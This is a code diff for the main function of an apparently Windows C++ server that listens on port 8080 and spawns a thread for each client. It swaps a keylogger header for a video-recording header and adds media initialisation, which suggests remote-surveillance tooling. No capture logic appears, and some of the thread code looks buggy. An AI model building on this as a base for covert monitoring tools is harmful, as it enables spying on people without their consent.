@@ -4,10 +4,9 @@
 
 #include <vector>
 #include <string>
-#include <cstdint>
-
-#include "Keylogger.hpp"
 #include "RequestHandler.hpp"
+
+#include "VideoRecording.hpp"
 
 int main(int argc, char *argv[])
 {
@@ -23,6 +22,18 @@ int main(int argc, char *argv[])
     }
 
     std::cout << "Winsock initialized successfully" << '\n';
+
+	HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
+	if (FAILED(hr)) {
+		std::cerr << "Failed to initialize COM library: " << std::hex << hr << std::endl;
+		return 1;
+	}
+	hr = MFStartup(MF_VERSION);
+	if (FAILED(hr)) {
+		std::cerr << "Failed to initialize COM library: " << std::hex << hr << std::endl;
+		CoUninitialize();
+		return 1;
+	}
 
 
     const SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
@@ -55,13 +66,12 @@ int main(int argc, char *argv[])
     }
     std::cout << "Server is listening on port 8080..." << std::endl;
 
-    RequestHandler requestHandler;
-
     std::vector<HANDLE> clients;
     int idx = 0;
     while (true)
     {
-        sockaddr_in clientAddr{};
+	    RequestHandler requestHandler;
+	    sockaddr_in clientAddr{};
         int clientSize = sizeof(clientAddr);
         const SOCKET clientSocket = accept(serverSocket, reinterpret_cast<sockaddr *>(&clientAddr), &clientSize);
         if (clientSocket == INVALID_SOCKET)
@@ -71,7 +81,7 @@ int main(int argc, char *argv[])
         HANDLE client_thread = CreateThread(
             nullptr,
             0,
-            LPTHREAD_START_ROUTINE(requestHandler.ProcessClient),
+            LPTHREAD_START_ROUTINE(&requestHandler.ProcessClient),
             reinterpret_cast<LPVOID>(clientSocket),
             0,
             nullptr
@@ -94,5 +104,7 @@ int main(int argc, char *argv[])
     }
     closesocket(serverSocket);
     WSACleanup();
+	MFShutdown();
+	CoUninitialize();
     return 0;
 }
